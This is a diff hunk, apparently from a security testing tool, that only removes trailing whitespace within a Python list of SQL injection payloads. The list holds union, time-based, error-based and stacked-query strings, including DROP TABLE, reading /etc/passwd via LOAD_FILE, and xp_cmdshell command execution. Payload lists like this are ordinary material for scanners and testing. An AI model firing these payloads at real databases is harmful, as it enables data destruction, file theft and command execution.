@@ -6,42 +6,42 @@ SQLI_PAYLOADS = [
     "' OR '1'='1' --",
     '" OR "1"="1',
     "' OR 1=1--",
-    
+
     # Union-based
     "' UNION SELECT 1,2,3--",
     "' UNION SELECT NULL,NULL,NULL--",
     "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
-    
+
     # Boolean-based
     "' AND '1'='1",
     "' AND '1'='2",
     "' OR '1'='2",
-    
+
     # Time-based
     "' OR SLEEP(5)--",
     "' OR pg_sleep(5)--",
     "' OR dbms_lock.sleep(5)--",
     "' WAITFOR DELAY '0:0:5'--",
-    
+
     # Error-based
     "' AND 1=CONVERT(int, @@version)--",
     "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--",
     "' AND 1=CAST(@@version AS int)--",
-    
+
     # Stacked queries
     "'; DROP TABLE users--",
     "'; DROP TABLE users; SELECT 1--",
     "'; INSERT INTO users VALUES(1,'admin','password')--",
-    
+
     # MySQL-specific
     "' INTO OUTFILE '/tmp/evil.txt'--",
     "' INTO DUMPFILE '/tmp/evil.txt'--",
     "' UNION SELECT LOAD_FILE('/etc/passwd')--",
-    
+
     # PostgreSQL-specific
     "' UNION SELECT current_database(),current_user,version()--",
     "'; CREATE TABLE test AS SELECT * FROM users--",
-    
+
     # MSSQL-specific
     "' UNION SELECT @@version,db_name(),user_name()--",
     "'; EXEC xp_cmdshell('whoami')--",
